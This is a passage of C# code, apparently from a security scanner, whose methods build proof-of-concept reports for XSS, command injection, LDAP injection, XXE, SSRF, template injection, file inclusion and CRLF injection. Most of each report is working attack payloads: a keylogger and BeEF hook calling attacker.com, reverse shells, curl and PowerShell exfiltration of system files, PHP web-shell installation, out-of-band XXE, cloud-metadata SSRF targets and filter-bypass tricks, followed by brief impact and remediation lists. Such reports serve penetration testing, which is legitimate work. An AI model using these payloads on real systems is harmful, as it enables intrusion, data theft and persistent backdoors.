   <script>document.onkeypress=function(e){{fetch('http://attacker.com/log?key='+e.key)}}</script>

3. Phishing:
   <script>document.body.innerHTML='<h1>Session Expired</h1><form action=""http://attacker.com"">...</form>'</script>

4. XSS Worm (Self-Propagating):
   <script>/* Fetch and execute self-replicating code */</script>

5. BeEF Hook:
   <script src=""http://attacker.com/hook.js""></script>

6. Advanced Exploitation:
   - Port scanning: Use fetch() to scan internal network
   - CSRF attacks: Execute state-changing requests
   - Credential harvesting via fake login forms
   - Browser exploitation via chained exploits

WAF Bypass Techniques:
   - HTML entity encoding: &#60;script&#62;
   - Unicode bypass: \\u003cscript\\u003e
   - Polyglot payloads: jaVasCript:/*-/*`/*\\`/*'/*""/**/(/* */oNcliCk=alert())
   - Mutation XSS: <noscript><p title=""</noscript><img src=x onerror=alert(1)>"">

Impact:
   - Account compromise
   - Data theft
   - Malware distribution
   - Website defacement

Remediation:
   - Output encoding (HTML, JavaScript, CSS, URL contexts)
   - Content Security Policy (CSP)
   - HTTPOnly and Secure cookie flags
   - X-XSS-Protection header
   - Input validation
   - Use modern frameworks with auto-escaping";
        }

        private string GenerateCommandInjectionPoCAdvanced(string url, string param, string payload)
        {
            return $@"Command Injection PoC:

Target URL: {url}
Vulnerable Parameter: {param}
Payload: {payload}

Exploitation Examples:

1. Information Gathering:
   Linux: ; uname -a; cat /etc/passwd
   Windows: & ver & type C:\\windows\\win.ini

2. Reverse Shell:
   Linux: ; bash -i >& /dev/tcp/attacker.com/4444 0>&1
   Windows: & powershell -nop -c ""$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);...""

3. Data Exfiltration:
   ; curl -X POST -d @/etc/passwd http://attacker.com/collect
   & powershell Invoke-WebRequest -Uri http://attacker.com -Method POST -Body (Get-Content C:\\sensitive.txt)

4. Backdoor Installation:
   ; echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php
   & echo ^<?php system($_GET[""cmd""]); ?^> > C:\\inetpub\\wwwroot\\shell.php

5. Blind Command Injection:
   Time-Based: ; sleep 10
   Out-of-Band: ; nslookup attacker.com
   Error-Based: ; ls /nonexistent 2>&1

6. Bypass Techniques:
   - Space bypass: {IFS}cat{IFS}/etc/passwd
   - Quotes: l''s or l\"\"s
   - Backslash: l\\s
   - Variable expansion: $(echo${IFS}whoami)
   - Wildcards: /???/??t /etc/passwd

Advanced Scenarios:
   - Privilege escalation via SUID binaries
   - Lateral movement to internal systems
   - Persistence through cron jobs/scheduled tasks
   - Credential harvesting from config files

Impact:
   - Full system compromise
   - Data breach
   - Service disruption
   - Use as pivot point for internal network attacks

Remediation:
   - Avoid system calls with user input
   - Use language-specific libraries instead of shell commands
   - Input validation with strict whitelist
   - Principle of least privilege
   - Sandboxing and containerization";
        }

        private string GenerateLDAPInjectionPoC(string url, string param, string payload)
        {
            return $@"LDAP Injection PoC:

Target URL: {url}
Vulnerable Parameter: {param}
Payload: {payload}

LDAP Injection Techniques:

1. Authentication Bypass:
   username=*)(uid=*))(|(uid=*
   Result: (&(uid=*)(uid=*))(|(uid=*)(userPassword=password))

2. Blind LDAP Injection:
   username=admin*)(&(objectClass=*
   username=admin)(|(password=*

3. Advanced Filter Manipulation:
   *)(&(objectClass=*)(cn=*
   *)(objectClass=*))(|(objectClass=*

4. Data Extraction:
   *)(&(mail=*@domain.com
   *)(&(description=*

Impact:
   - Authentication bypass
   - Unauthorized data access
   - Information disclosure
   - Privilege escalation

Remediation:
   - Use parameterized LDAP queries
   - Input validation and sanitization
   - Escape special LDAP characters: * ( ) \\ / , ; + < > "" =
   - Principle of least privilege
   - Monitor LDAP queries for anomalies";
        }

        private string GenerateXXEPoC(string url, string payload)
        {
            return $@"XML External Entity (XXE) PoC:

Target URL: {url}
Payload: {payload}

XXE Attack Scenarios:

1. Local File Disclosure:
   <?xml version=""1.0""?>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]>
   <foo>&xxe;</foo>

2. Out-of-Band Data Exfiltration:
   <?xml version=""1.0""?>
   <!DOCTYPE foo [<!ENTITY % file SYSTEM ""file:///etc/passwd"">
   <!ENTITY % dtd SYSTEM ""http://attacker.com/evil.dtd"">
   %dtd;]>

   evil.dtd:
   <!ENTITY % all ""<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>"">
   %all;

3. SSRF via XXE:
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://internal-server/admin"">]>

4. Blind XXE:
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://attacker.com/detect"">%xxe;]>

5. XXE via SVG:
   <svg xmlns:svg=""http://www.w3.org/2000/svg"">
   <!DOCTYPE svg [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]>
   <text>&xxe;</text>
   </svg>

Impact:
   - Sensitive file disclosure
   - SSRF attacks
   - Denial of Service
   - Port scanning of internal network

Remediation:
   - Disable external entity processing
   - Use less complex data formats (JSON)
   - Input validation
   - Keep XML processors updated
   - Use local static DTDs";
        }

        private string GenerateSSRFPoC(string url, string param, string payload)
        {
            return $@"Server-Side Request Forgery (SSRF) PoC:

Target URL: {url}
Vulnerable Parameter: {param}
Payload: {payload}

SSRF Attack Scenarios:

1. Cloud Metadata Access:
   AWS: http://169.254.169.254/latest/meta-data/
   GCP: http://metadata.google.internal/computeMetadata/v1/
   Azure: http://169.254.169.254/metadata/instance?api-version=2020-09-01

2. Internal Network Scanning:
   http://10.0.0.1:80
   http://192.168.1.1:22
   http://localhost:3306

3. Protocol Exploitation:
   file:///etc/passwd
   dict://localhost:11211/stats
   gopher://localhost:6379/_INFO

4. Bypassing Filters:
   http://127.1 (decimal: 2130706433)
   http://0x7f.0.0.1 (hex)
   http://[::1]/ (IPv6)
   http://127.0.0.1.xip.io

5. Advanced Exploitation:
   - Redis command injection via gopher://
   - Memcached poisoning
   - SMTP exploitation
   - Reading local files

Impact:
   - Cloud credentials theft
   - Internal network reconnaissance
   - Access to internal services
   - Data exfiltration
   - Remote code execution

Remediation:
   - Whitelist allowed domains/IPs
   - Block private IP ranges
   - Disable unnecessary URL schemas
   - Use authentication for internal services
   - Network segmentation";
        }

        private string GenerateSSTIPoC(string url, string param, string payload, string templateEngine)
        {
            return $@"Server-Side Template Injection (SSTI) PoC:

Target URL: {url}
Vulnerable Parameter: {param}
Payload: {payload}
Template Engine: {templateEngine}

Engine-Specific Exploitation:

1. Jinja2 (Python):
   {{config.items()}}
   {{''.__class__.__mro__[1].__subclasses__()}}
   {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

2. Twig (PHP):
   {{_self.env.registerUndefinedFilterCallback(""exec"")}}{{_self.env.getFilter(""id"")}}

3. FreeMarker (Java):
   ${{""freemarker.template.utility.Execute""?new()(""id"")}}

4. Thymeleaf (Java):
   ${{T(java.lang.Runtime).getRuntime().exec('id')}}

5. ERB (Ruby):
   <%= system('id') %>
   <%= `whoami` %>

Impact:
   - Remote code execution
   - Server compromise
   - Data exfiltration
   - Lateral movement

Remediation:
   - Use sandboxed template environments
   - Never pass user input directly to templates
   - Implement strict template syntax restrictions
   - Regular security updates";
        }

        private string GenerateFileInclusionPoC(string url, string param, string payload, string inclusionType)
        {
            return $@"{inclusionType} PoC:

Target URL: {url}
Vulnerable Parameter: {param}
Payload: {payload}

Exploitation Techniques:

1. Basic LFI:
   ../../../../etc/passwd
   ..\\..\\..\\..\\windows\\win.ini

2. PHP Wrappers:
   php://filter/convert.base64-encode/resource=index.php
   php://input (with POST data: <?php system($_GET['cmd']);?>)
   data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

3. Log Poisoning:
   /var/log/apache2/access.log (inject PHP code via User-Agent)
   /var/log/nginx/error.log

4. Session File Inclusion:
   /var/lib/php/sessions/sess_[PHPSESSID]

5. /proc/ Exploitation:
   /proc/self/environ (inject PHP via User-Agent)
   /proc/self/cmdline

6. Remote File Inclusion (RFI):
   http://attacker.com/shell.txt
   \\\\attacker.com\\share\\shell.php

Impact:
   - Source code disclosure
   - Remote code execution
   - Sensitive file access
   - Server compromise

Remediation:
   - Never use user input in file operations
   - Use whitelist of allowed files
   - Disable allow_url_include (PHP)
   - Implement proper access controls
   - Use basename() to strip directory paths";
        }

        private string GenerateCRLFInjectionPoC(string url, string param, string payload)
        {
            return $@"CRLF Injection / HTTP Response Splitting PoC:

Target URL: {url}
Vulnerable Parameter: {param}
Payload: {payload}

Attack Scenarios:

1. Session Fixation:
   %0d%0aSet-Cookie: sessionid=attacker_controlled

2. Cache Poisoning:
   %0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>Malicious Content</html>

3. XSS via Header Injection:
   %0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(document.cookie)</script>

4. Open Redirect:
   %0d%0aLocation: http://attacker.com

5. Header Manipulation:
   %0d%0aX-XSS-Protection: 0
   %0d%0aX-Frame-Options: ALLOW

Impact:
   - Session hijacking
   - Cache poisoning
   - Cross-site scripting
   - Security header bypass

Remediation:
   - Validate and sanitize all headers
   - Remove CR/LF characters from user input
   - Use framework's built-in header functions
   - Implement Content Security Policy";
        }

        #endregion
    }
}
